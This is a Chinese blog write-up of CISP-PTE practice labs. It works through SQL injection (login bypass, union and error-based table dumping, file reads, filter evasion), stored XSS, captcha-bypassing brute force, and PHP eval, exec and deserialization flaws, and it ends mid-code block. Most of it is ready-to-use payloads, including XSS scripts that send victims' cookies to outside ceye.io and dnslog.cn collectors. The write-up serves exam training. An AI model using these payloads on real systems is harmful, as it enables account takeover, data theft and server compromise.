---
title: 【PTE】CISP-PTE考试基础题练习
date: 2026-03-24
image: /images/126.webp
categories:
  - 其他
---
# SQL注入1
登录admin用户后即可获得flag
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251208161301.png)
POC:
```
' OR 1=1 -- 
1
```
flag:
```
flag_nisp_112830
```
# SQL注入2
开启环境：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217140551.png)
抓包发现返回UA头信息。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217140614.png)
首先我们先加一个反斜杠在UA头里，看一下这个闭合方式是什么样子的。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217140811.png)

根据返回内容，大致猜出了这个表里的数据是什么样子的。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217140919.png)
那么我们怎么去闭合呢？
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '58.247.126.6', 'admin')' at line 1

('ua','ip','admin')
那么我们怎么去闭合呢？
这样就达到了闭合的目的：
('ua',,1,2)#'ip','admin')
```
然后在UA头里进行构造。
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',1,2)# 
发现使用：',1,2)# 成功构造。
那我们可以直接使用1号位和2号位进行payload。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217142207.png)
那么我们可以直接使用updatexml()函数进行payload。
**updatexml()使用**
```
updatexml(1,2,3)
1.被修改数据
2.修改位置
3.修改数据
例如：
updatexml(123,2,'b')   输出：1b3
如果是：
updatexml(123,'b',2)
这样的话b不代表一个位置，则会保存，会将b打印出来。 
```
Payload:
```
首先看一下这个语句
updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)
读取当前数据库的所有表名：都有什么？
information_schema.tables：MySQL 系统库，存储所有数据库 / 表的元数据；
table_schema=database()：筛选出当前连接的数据库（database() 返回当前数据库名）；
group_concat(table_name)：将所有表名拼接成一个字符串（避免多行结果，方便一次性读取）。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217145530.png)
```
updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'flagage')),1)
这个语句就可以说明flagage表中有几个数据
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251217145603.png)
```
updatexml(1,concat(0x7e,(select flagnisp from flagage where id = 1)),1)

updataxml(1,concat(0x7e))
```
成功找到flag
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',updatexml(1,concat(0x7e,(select flagnisp from flagage where id = 1)),1),2)# 
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260310151234.png)

# SQL注入3*
## 思路
第一步
```
使用万能密码进行登录：
1' or 1=1#
123456
```
第二步
```
找注入点：
患者->编辑处->pid参数进行测试

pid=2'   没有回显

pid=2' --+  加上注释，这个页面正常回显。

1.判断列数
pid=2' order by 16 --+    判断一下列数，16时报错，15时正常回显，说明有15列

pid=2' order by 16 --+  报错
pid=2' order by 15 --+  回显

 2.判断回显位置
 
pid=0' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+
这里网站会显示有几个可以利用。

3.读文件
命令:load_file('var/www/html/key.flag')
pid=0' union select 1,2,3,4,5,6,7,8,9,10,11,12,load_file('/var/www/html/key.flag'),14,15 --+
```
## 解题
### 1.登录页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225091909.png)
### 2.使用万能登录密码
```
1' or 1=1#
123456
```
成功登录
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092048.png)
### 3.找注入点
```
患者->编辑处->pid参数进行测试
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092209.png)
```
pid=2'   没有回显
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092234.png)
```
pid=2' --+  加上注释，这个页面正常回显。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092310.png)
### 4.判断列数
```
pid=2' order by 16 --+    判断一下列数，16时报错，15时正常回显，说明有15列。

pid=2' order by 16 --+  报错
pid=2' order by 15 --+  回显
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092401.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092416.png)
### 5.判断回显位置
```
http://211.103.180.146:34196/?m=patient&o=edit&pid=0'union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+

可以看出回显位置为：5，4，11，13。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225092538.png)

### 6.读文件（读取flag）
```
http://211.103.180.146:34196/?m=patient&o=edit&pid=0'union select 1,2,3,4,5,6,7,8,9,10,11,12,load_file('/var/www/html/key.flag'),14,15 --+
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225093641.png)
```
flag_nisp_783819
```
# SQL注入4
## 思路
在数据库中找到flag
第一步
```
找注入点：
以文章为例：id参数进行测试
id=33'   报错  （根据报错信息判断->单引号有问题，根据回显 {"'}  判断有可能是数字型注入）
id=33' or 1=1 --+    报错（" or 1=1 --）这种报错
id=33') or 1=1 --+  报错（") or 1=1 --）这种报错
判断为数值型的注入

id=33 or 1=1 --+  闭合符号去掉，再次访问，发现没有问题。   正常回显
```
第二步
```
判断列数

id=33 order by 16 --+   报错（Unknown column '16' in 'order clause'）
id=33 order by 15 --+   正常回显
说明有15列
```
第三步
```
判断回显字段
id=0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+   发现回显字段为3和11。
```
第四步
```
在数据库中找到flag
1.获取数据库名称 
id=0 union select 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15 --+   回显 cms
2.获取表名
id=0 union select 1,2,group_concat(table_name),4,5,6....15 from information_schema.tables where table_schema=database()  --+ 报错（这里面是一个中文页面，是有GBK编码的。这里需要编码）。
3.进行编码，然后再获取表名
id=0 union select 1,2,group_concat(convert(table_name using gbk)),4,5,6....15 from information_schema.tables where table_schema=database() --+   回显所有表名，可以找到一个cms_flag的字段。
4.都有哪些字段名（cms_flag）
id=0 union select 1,2,group_concat(convert(column_name using gbk)),4,5,6....15 from information_schema.columns where table_schema=database() and table_name='cms_flag' --+    回显->flag   字段也叫flag
5.直接查看flag文件内容
id=0 union select 1,2,group_concat(flag),4,5,6....15 from cms.cms_flag --+   回显flag值。
```
## 解题
### 1.登录页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225100012.png)
### 2.找注入点
```
找到国内新闻页面后点击任何一个新闻页面就会发现一个id参数进行测试。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225103144.png)

### 3.判断注入类型
```
id=33'   报错  （根据报错信息判断->单引号有问题，根据回显 {"'}  判断有可能是数字型注入）
id=33' or 1=1 --+    报错（" or 1=1 --）这种报错
id=33') or 1=1 --+  报错（") or 1=1 --）这种报错
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225100215.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225100234.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225100249.png)
```
id=33 or 1=1 --+  闭合符号去掉，再次访问，发现没有问题。   正常回显
判断为数值型注入
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225100318.png)
### 4.判断列数
```
id=33 order by 16 --+   报错（Unknown column '16' in 'order clause'）
id=33 order by 15 --+   正常回显
说明有15列
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225103222.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225103235.png)
### 5.判断回显字段
```
http://211.103.180.146:35043/show.php?id=0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+
根据回显发现，字段为3和11。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225103633.png)
### 6.数据库中找到flag
（1）获取数据库名称
```
id=33 union select 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15 --+   回显 cms

数据库名称为：cms
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225103857.png)
（2）获取表名（报错，需要编码）
```
http://211.103.180.146:35043/show.php?id=0 union select 1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() --+
报错（这里面是一个中文页面，是有GBK编码的。这里需要编码）。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225104250.png)
（2）获取表名（编码后）
```
http://211.103.180.146:35043/show.php?id=0 union select 1,2,group_concat(convert(table_name using gbk)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() --+
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225104442.png)
### 7.都有哪些字段名
```
http://211.103.180.146:35043/show.php?id=0 union select 1,2,group_concat(convert(column_name using gbk)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns where table_schema=database() and table_name='cms_flag' --+
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225104622.png)
### 8.查看flag文件内容
```
http://211.103.180.146:35043/show.php?id=0 union select 1,2,group_concat(flag),4,5,6,7,8,9,10,11,12,13,14,15 from cms.cms_flag

回显flag值。
flag_nisp_49406c
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225104816.png)
# SQL注入5
## 思路
注入点
```
直接主页面的id参数为注入点

闭合符号的测试
id=1') --+    可以看出空格被过滤掉了。
id=1') #       #也被过滤掉了
id=1') %23   可以看到编码并没有被过滤掉。

可以使用%23进行绕过过滤。
空格：%0b
%：%23
判断列数
id=1')%0border%0bby%0b4%23   对列数进行判断，说明有4列。

判断回显参数
id=0')%0bunion%0bselect%0b1,2,3,4%23   这里你就会发现un被过滤掉了
这里进行双写绕过
id=0')%0bununionion%0bselect%0b1,2,3,4%23   这里2，3，4是有回显的。

读取文件
id=0')%0bununionion%0bselect%0b1,2,3,load_file('/tmp/key.flag')%23
```
## 解题
### 1.主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225105925.png)
### 2.注入点
```
进入答题的id为注入点
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110015.png)
### 3.闭合符号的测试
```
id=1') --+    可以看出空格被过滤掉了。
id=1') #       #也被过滤掉了
id=1') %23   可以看到编码并没有被过滤掉。
```

![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110118.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110135.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110203.png)
```
可以使用%23进行绕过过滤。
空格：%0b
%：%23
```
### 4.判断列数
```
id=1')%0border%0bby%0b4%23   报错，说明应该小于5列。
id=1')%0border%0bby%0b4%23   正常回显，说明为4列。
```

![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110320.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110401.png)
### 5.判断回显参数
```
id=0')%0bunion%0bselect%0b1,2,3,4%23   这里你就会发现un被过滤掉了
这里进行双写绕过
id=0')%0bununionion%0bselect%0b1,2,3,4%23   这里2，3，4是有回显的。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110505.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110623.png)
6.读取flag文件
```
id=0')%0bununionion%0bselect%0b1,2,3,load_file('/tmp/key.flag')%23
回显:flag_nisp_5f8554
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225110717.png)
# SQL注入6
## 思路
注入点
```
登录页面使用万能密码进行登录
账号：1' or 1=1#
密码：123
可以直接登录成功。

发表文章一篇测试文章。发现出来了一个id参数。id=13  说明前面有13条文章。

万能密码解析：
原始语句：
SELECT * FROM 表名 where username=' ' and password=' '

输入账号：1' or 1=1#
 
语句就变成这样了：
SELECT * FROM 表名 where username='1' or 1=1# ' and password=' '

在后台执行的是这条语句：
SELECT * FROM 表名 where username='1' or 1=1

username='1'   假
1=1                      真

假 or 真  == 真
登录成功。

也可以通过注册账号登录进去。

发表文章功能:

insert into 表名(标题，内容) values ('标题','内容')

可以直接在发表文章中的内容中构建SQL语句。

('1','2') --')

1
2' --     报错：'123','default_value',NOW()

2') --    报错：我们构造的语句和数据库的语句不符合。 

2','123','default_value',NOW()) --     5个值。    发布成功。

2','3','4',NOW()) -- 

所以代码就应该是:
insert into 表名(标题，内容，作者，隐藏字段，时间) values ('1','2','3','4',NOW()) --)

构造Payload:

第一次：
(SELCET VERSION())
2','3','4',NOW()) -- 
报错，这里的SELCET VERSION()并没有当成命令执行，而是当成了字符串。

第二次：（在2处进行测试）
1
(SELECT VERSION()),'3','4',NOW()) --    报错，这里就可以看出2处不可用。

第三次：（在3处进行测试）
2',(SELECT VERSION()),4',NOW()) --       成功发布，直接显示了数据库的版本信息。

第四次：（在4处进行测试）
2','3',(SELECT VERSION()),NOW()) --      成功发布，直接显示了数据库的版本信息。

构造语句：
查询数据库的库名：
2',(select database()),4',NOW()) --       成功发布，数据库名：php_test

从库到表

表名
select group_concat(table_name) from information_schema.tables where table_schema='php_test'

2',(select group_concat(table_name) from information_schema.tables where table_schema='php_test' ),'4',NOW()) --       发布成功   两张表

列（字段）

select group_concat(column_name) from information_schema.column where table_schema='php_test' and table_name='users'
select group_concat(column_name) from information_schema.column where table_schema='php_test' and table_name='articles'

2',(select group_concat(column_name) from information_schema.column where table_schema='php_test' and table_name='articles'),'4',NOW()) --   

查值

select group_concat(username,password) from php_test.users

flag就在password里。

然后直接查询password即可。
select group_concat(password) from php_test.users


```
## 解题
### 1.登录页面
拼接index.php
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225135900.png)
### 2.万能密码进行登录
```
登录页面使用万能密码进行登录
账号：1' or 1=1#
密码：123
可以直接登录成功。

发表文章一篇测试文章。发现出来了一个id参数。id=13  说明前面有13条文章。

万能密码解析：
原始语句：
SELECT * FROM 表名 where username=' ' and password=' '

输入账号：1' or 1=1#
 
语句就变成这样了：
SELECT * FROM 表名 where username='1' or 1=1# ' and password=' '

在后台执行的是这条语句：
SELECT * FROM 表名 where username='1' or 1=1

username='1'   假
1=1                      真

假 or 真  == 真
登录成功。
万能登录密码进行登录
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225140031.png)
### 3.测试发表文章功能
```
原始代码应该是：
insert into 表名(标题，内容) values ('标题','内容')

可以直接在发表文章中的内容中构建SQL语句。
('1','2') --')
1
2' --   【这里--后面有个空格】  报错：'123','default_value',NOW()

文章发表失败：SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'testuser', 'default_value', NOW())' at line 2
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225140229.png)
```
2') --    报错：我们构造的语句和数据库的语句不符合。 
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225140606.png)
```
然后我们就可以直接拼接语句
2','123','default_value',NOW()) --     5个值。    发布成功。

这里可以看到作者对应的就是我们的123.
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225140650.png)
得出结论
```
拼接语句就是这样的：2','3','4',NOW()) --
所以代码就应该是:
insert into 表名(标题，内容，作者，隐藏字段，时间) values ('1','2','3','4',NOW()) --)
```
### 4.判断回显参数
第一次：（在1处进行测试）
```
标题：(SELECT VERSION())
内容：2','3','4',NOW()) -- 
报错，这里的SELCET VERSION()并没有当成命令执行，而是当成了字符串。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225141001.png)
```
这里的SELCET VERSION()并没有当成命令执行，而是当成了字符串。所以1号位不能执行。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225141016.png)
第二次：（在2处进行测试）
```
标题：1
内容：(SELECT VERSION()),'3','4',NOW()) -- 
报错，这里就可以看出2处不可用。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225141223.png)

![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225141234.png)
第三次：（在3处进行测试）
```
标题：1
内容：2',(SELECT VERSION()),'4',NOW()) --      
成功发布，直接显示了数据库的版本信息。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225144309.png)
第四次：（在4处进行测试）
```
标题：1
内容：2','3',(SELECT VERSION()),NOW()) --      成功发布，直接显示了数据库的版本信息。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225144447.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225144457.png)
这里可以看出可以在3和4处进行构造payload。
### 5.查询数据库的库名
```
2',(SELECT DATABASE()),'4',NOW()) -- 
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225144739.png)

```
 成功发布，数据库名：php_test
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225144800.png)
### 6.查询表名
```
select group_concat(table_name) from information_schema.tables where table_schema='php_test'

SELECT GROUP_CONCAT(table_name) 
FROM information_schema.tables 
WHERE table_schema='php_test';


2',(select group_concat(table_name) from information_schema.tables where table_schema='php_test' ),'4',NOW()) -- 
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225144908.png)
```
查询成功，2张表。
分别为：articles和users
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225145126.png)
### 7.查询字段
```
查询users表中的所有字段
select group_concat(column_name) from information_schema.columns where table_schema='php_test' and table_name='users'
查询articles表中的所有字段
select group_concat(column_name) from information_schema.columns where table_schema='php_test' and table_name='articles'

payload：
2',(select group_concat(column_name) from information_schema.columns where table_schema='php_test' and table_name='users'),'4',NOW()) -- 
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225145826.png)
```
查询到所有字段为：id,username,password,created_at。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225145651.png)
### 8.查flag值
```
select group_concat(username,password) from php_test.users

2',(select group_concat(username,password) from php_test.users),'4',NOW()) -- 
flag就在password里。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225145931.png)
发现flag就在password里
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225145957.png)
```
然后直接查询password即可。
select group_concat(password) from php_test.users

2',(select group_concat(password) from php_test.users),'4',NOW()) -- 

flag：flag_nisp_7c9ef9
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225150055.png)
# SQL注入7
## 思路
```
进入注册的界面进行测试

先进行尝试注册
尝试1
admin'#  
1
1
报错

尝试2
admin'#--
1
1
注册成功

直接登录  admin'#--  /  1

然后修改密码：12

然后就直接修改了admin的密码为12。


```

## 解析
```
修改密码语句：
UPDATE user set PASSWORD='$pass' where username='$username' and password='$curr_pass'

尝试1：注册admin'#     不允许注册    还可以admin'#-
尝试2：注册admin'#--  注册成功

修改admin'#-- 密码

UPDATE user set PASSWORD=1 where username=admin'#-- and password='$curr_pass'

UPDATE user set PASSWORD=1 where username=admin'这里之后形成了一个注释。
之后的语句变成了这样：
UPDATE user set PASSWORD=1 where username=admin'
```
## 解题
### 1.登录页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151136.png)
### 2.账号注册
```
尝试1
admin'#  
1
1
报错
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151229.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151244.png)
```
尝试2
admin'#--
1
1
注册成功
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151309.png)
### 2.账号登录
```
账号：admin'#--
密码：1
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151351.png)
```
登录成功。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151430.png)

### 4.修改密码
```
修改admin'#-- 密码为12
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151516.png)

```
修改成功
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151534.png)

直接登录admin账号即可。
```
账号：admin
密码：12
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260225151626.png)


登录进去之后就是flag
```
flag_nisp_6fb119
```
# XSS1
## 思路
```
留言板->存储型的xss

管理员登录页面


直接在留言板里填写如下：
<script>
var img = document.createElement("img");
img.src = "http://94uyl2.ceye.io/log?" + escape(document.cookie);
document.body.appendChild(img);
</script>
攻击代码填写后主页面左下角就会出现一个小图片的东西，代表着就成功了。
使用这个网站进行测试
http://www.ceye.io/
获取你账户的这个值
94uyl2.ceye.io
登录这个网站，会反弹管理员的cookie
然后使用插件，进行管理员登录即可。
```
## 解题
### 1.登录页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226090828.png)
### 2.获取Cookie
代码解析
```
<script>
// 创建一个img元素，用于发送Cookie信息到指定的日志收集地址
var img = document.createElement("img");

// 拼接日志收集URL：将当前页面的Cookie信息通过URL参数传递
// escape() 函数用于对Cookie内容进行URL编码，避免特殊字符导致的传输错误
img.src = "http://94uyl2.ceye.io/log?" + escape(document.cookie);

// 将img元素添加到页面body中，触发图片加载，从而发送请求
document.body.appendChild(img);
</script>
```
攻击代码
```
<script>
var img = document.createElement("img");
img.src = "http://94uyl2.ceye.io/log?" + escape(document.cookie);
document.body.appendChild(img);
</script>

输入完以上代码后提交留言在主页面左下角就会出现一个小图片的表示就代表着攻击代码已经成功。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226092011.png)
```
然后在Log平台就能获取到Cookie
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226092001.png)
```
http://94uyl2.ceye.io/log?session%3Dnot_flag_nisp_sdfDA19QW

从这里可以看出session=not_flag_nisp_sdfDA19QW
```
### 3.获取flag
使用插件，对cookie进行编辑。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226092509.png)
这里选择修改请求头
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226092643.png)
内容为：
```
cookie
session=not_flag_nisp_sdfDA19QW
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226092701.png)
```
保存完之后，直接刷新主页面就会直接登录管理员账号，从而获取到flag
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226092834.png)
```
flag_nisp_30cf2b
```
# XSS2
## 思路
```
存储型的xss
发表文章

使用dnslog
DNSLOG平台：http://www.dnslog.cn/
写脚本
<script type="text/javascript">
var arr=document.cookie.split(/[;=]/);
var url="http://"+arr[1]+".          /xxx.png";
document.write('<img src="'+url+'"/>');
</script>   

写入后，dnslog就会带出来cookie。

```
## 解题
### 1.主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226094617.png)
### 2.恶意代码编写
```
<script type="text/javascript">
var arr=document.cookie.split(/[;=]/);
var url="http://"+arr[1]+".ipqljs.dnslog.cn/xxx.png";
document.write('<img src="'+url+'"/>');
</script>   
```
代码解析：
```php
<script type="text/javascript">
    // 将document.cookie按分号(;)或等号(=)分割成数组
    // 例如Cookie格式为 "key=value; name=test" 会被拆分为 ["key", "value", " name", "test"]
    var arr = document.cookie.split(/[;=]/);
    // 拼接图片请求URL：使用数组第二个元素（索引1）作为子域名，拼接dnslog地址
    var url = "http://" + arr[1] + ".ipqljs.dnslog.cn/xxx.png";
    // 向页面写入img标签，加载拼接后的URL，触发DNS/HTTP请求（常用于日志收集）
    document.write('<img src="' + url + '"/>');
</script>
```
这里使用了dnslog平台进行反弹cookie。
```
平台网站：http://www.dnslog.cn/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226094737.png)
```
可以看到已经上传成功了.
```
### 3.获取flag
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226094825.png)
```
dnslog平台成功获取到了flag
```

![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226094858.png)
```
flag_nisp_55cd6b
```
# 暴力破解1
## 思路
```
直接暴破即可。
有验证码（先输入正确的验证码，然后丢弃掉新验证码的生成数据包，再进行爆破即可。）
```
## 解题
### 1.登录页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226095828.png)
### 2.爆破
```
爆破的密码字典会给你，让你下载，直接下载到桌面就行。

抓取登录的数据包。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226095956.png)
```
获取成功后，放到Intruder页面去后，进行放行。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226100007.png)
```
看到这个数据包，直接丢弃。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226100055.png)
```
然后对登录页面直接进行爆破即可。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226100136.png)
```
然后就可以爆破出来了
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226100206.png)
```
flag_nisp_f71c8b
```
# 代码审计1*
## 思路
```php
源码：
<?php  
error_reporting(0);  
include "key4.php";  
$a=$_GET['a'];  
eval("\$o=strtolower(\"$a\");");  
echo $o;  
show_source(__FILE__);

如果a=test
那么$0 = strtolower("test")

a= abc\");phpinfo();//
那么 eval ($0 = strtolower(\"abc\");phpinfo();//\");");    //这是注释符
这样就是会执行phpinfo()。

然后直接在链接处构建a参数进行测试

a=123");system("ls");//
获得key.cisp key4.php vul.php这三个文件
a=123");system("cat key.cisp");//
然后就可以获取flag了
```
## 解题
### 1.首页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226102956.png)
解析
```
<?php  
error_reporting(0);  
include "key4.php";  
$a=$_GET['a'];  
eval("\$o=strtolower(\"$a\");");  
echo $o;  
show_source(__FILE__);

如果a=test
那么$0 = strtolower("test")

a= abc\");phpinfo();//
那么 eval ($0 = strtolower(\"abc\");phpinfo();//\");");    //这是注释符
这样就是会执行phpinfo()。
```
### 2.构建恶意代码
```
http://211.103.180.146:34897/start/vul.php?a=123");system("ls");//

获得key.cisp key4.php vul.php这三个文件
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226103136.png)
### 3.获取flag
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226103207.png)
```
flag_nisp_bdfcc5
```
# 代码审计2
## 思路
```php
<?php  
error_reporting(0); show_source(__FILE__);  
if(strlen($_GET[1]<30)){  
    echo strlen($_GET[1]);  
    echo exec($_GET[1]);  
}else{  
    exit('too more');  
}  
?>

这里命令执行的话是没有回显的。

首先构造一个参数，让命令执行后的结果，放到一个文件里
http://211.103.180.146:32398/index.php?1=ls>1.txt
然后访问一下1.txt
http://211.103.180.146:32398/1.txt
这里就会有flag.nisp文件，直接进行访问即可。
http://211.103.180.146:32398/flag.nisp

```
## 解题
### 1.首页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226104052.png)
### 2.代码分析
```
<?php  
error_reporting(0); show_source(__FILE__);  
if(strlen($_GET[1]<30)){  
    echo strlen($_GET[1]);  
    echo exec($_GET[1]);  
}else{  
    exit('too more');  
}  
?>
这里命令执行的话是没有回显的。
所以需要把执行的命令结果放到一个文件里即可。
```

```
http://211.103.180.146:32398/index.php?1=ls>1.txt
然后访问一下这个1.txt即可：
http://211.103.180.146:32398/1.txt
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226104247.png)
```
1.txt
flag.nisp
index.php
这里flag.nisp就是我们的flag。
```
### 3.读取flag
```
http://211.103.180.146:32398/flag.nisp
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226104340.png)
```
flag_nisp_f7819a
```
# 代码审计3
## 思路
```php
反序列化
源代码：
<?php  
error_reporting(0);     //关闭错误显示
include "flag.php";     //包含了一个flag.php文件
$TEMP = "CISP";           //两个变量 CISP
$str = $_GET['str'];       //通过用户获取的str参数
if (unserialize($str) === $TEMP)    //if判断，unserialize反序列化的参数，如果反序化的结果等于TEMP就输出flag。
{  
    echo "$flag";  
}  
show_source(__FILE__);

这里只需要把CISP序列化一下即可。

?str=s:4:"CISP";   //提交序列化的值后就会获取到flag值。
```
## 解题
### 1.主页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260226105122.png)
### 2.代码分析
```
源代码：
<?php  
error_reporting(0);     //关闭错误显示
include "flag.php";     //包含了一个flag.php文件
$TEMP = "CISP";           //两个变量 CISP
$str = $_GET['str'];       //通过用户获取的str参数
if (unserialize($str) === $TEMP)    //if判断，unserialize反序列化的参数，如果反序化的结果等于TEMP就输出flag。
{  
    echo "$flag";  
}  
show_source(__FILE__);

这里只需要把CISP序列化一下即可。
```
直接使用代码：
```
<?php
